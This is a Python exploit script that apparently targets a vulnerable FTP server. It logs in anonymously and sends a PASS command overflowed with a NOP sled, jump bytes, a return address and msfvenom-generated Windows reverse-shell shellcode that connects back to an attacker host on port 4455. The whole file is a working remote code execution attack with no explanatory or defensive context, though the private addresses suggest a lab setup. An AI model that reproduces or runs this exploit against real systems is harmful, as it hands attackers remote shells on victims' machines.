import socket
import sys

rhost = "192.168.92.132"		# Target RHOST
rport = int('21')						# Target RPORT
ftpuser = 'anonymous'				# Login with FTP username. This account MUST exist and permit anonymous login

ret = "\xbb\x14\x40\x00" 	# Return address - Source Metasploit (Little Endian)
nop = "\x90" * (801-9-351)	# NOP string must be 801-9-$(payload size) below
 
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4455 -f python -b '\x00\x0a\x0d'
#Payload size: 351 bytes

buf =  ""
buf += "\xdb\xdb\xd9\x74\x24\xf4\xba\xb5\x2b\x0f\xb0\x5d\x29"
buf += "\xc9\xb1\x52\x31\x55\x17\x83\xc5\x04\x03\xe0\x38\xed"
buf += "\x45\xf6\xd7\x73\xa5\x06\x28\x14\x2f\xe3\x19\x14\x4b"
buf += "\x60\x09\xa4\x1f\x24\xa6\x4f\x4d\xdc\x3d\x3d\x5a\xd3"
buf += "\xf6\x88\xbc\xda\x07\xa0\xfd\x7d\x84\xbb\xd1\x5d\xb5"
buf += "\x73\x24\x9c\xf2\x6e\xc5\xcc\xab\xe5\x78\xe0\xd8\xb0"
buf += "\x40\x8b\x93\x55\xc1\x68\x63\x57\xe0\x3f\xff\x0e\x22"
buf += "\xbe\x2c\x3b\x6b\xd8\x31\x06\x25\x53\x81\xfc\xb4\xb5"
buf += "\xdb\xfd\x1b\xf8\xd3\x0f\x65\x3d\xd3\xef\x10\x37\x27"
buf += "\x8d\x22\x8c\x55\x49\xa6\x16\xfd\x1a\x10\xf2\xff\xcf"
buf += "\xc7\x71\xf3\xa4\x8c\xdd\x10\x3a\x40\x56\x2c\xb7\x67"
buf += "\xb8\xa4\x83\x43\x1c\xec\x50\xed\x05\x48\x36\x12\x55"
buf += "\x33\xe7\xb6\x1e\xde\xfc\xca\x7d\xb7\x31\xe7\x7d\x47"
buf += "\x5e\x70\x0e\x75\xc1\x2a\x98\x35\x8a\xf4\x5f\x39\xa1"
buf += "\x41\xcf\xc4\x4a\xb2\xc6\x02\x1e\xe2\x70\xa2\x1f\x69"
buf += "\x80\x4b\xca\x3e\xd0\xe3\xa5\xfe\x80\x43\x16\x97\xca"
buf += "\x4b\x49\x87\xf5\x81\xe2\x22\x0c\x42\xcd\x1b\x52\x14"
buf += "\xa5\x59\x6a\x09\x51\xd7\x8c\x43\x8d\xb1\x07\xfc\x34"
buf += "\x98\xd3\x9d\xb9\x36\x9e\x9e\x32\xb5\x5f\x50\xb3\xb0"
buf += "\x73\x05\x33\x8f\x29\x80\x4c\x25\x45\x4e\xde\xa2\x95"
buf += "\x19\xc3\x7c\xc2\x4e\x35\x75\x86\x62\x6c\x2f\xb4\x7e"
buf += "\xe8\x08\x7c\xa5\xc9\x97\x7d\x28\x75\xbc\x6d\xf4\x76"
buf += "\xf8\xd9\xa8\x20\x56\xb7\x0e\x9b\x18\x61\xd9\x70\xf3"
buf += "\xe5\x9c\xba\xc4\x73\xa1\x96\xb2\x9b\x10\x4f\x83\xa4"
buf += "\x9d\x07\x03\xdd\xc3\xb7\xec\x34\x40\xc7\xa6\x14\xe1"
buf += "\x40\x6f\xcd\xb3\x0c\x90\x38\xf7\x28\x13\xc8\x88\xce"
buf += "\x0b\xb9\x8d\x8b\x8b\x52\xfc\x84\x79\x54\x53\xa4\xab"

exploit = buf + nop + "\xe9\xe3\xfc\xff\xff" + "\xeb\xf9" + "\x90\x90" + ret
password = "PASS " + exploit + "\r\n"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
client.connect((rhost,rport))                               #Connect to TCP socket
client.recv(1024)
client.sendall("USER " + ftpuser + "\r\n")                  #Login with FTP creds
client.recv(1024)
client.sendall(password)	                                  # Send buffer overflow
client.close()

print("\nDone!")
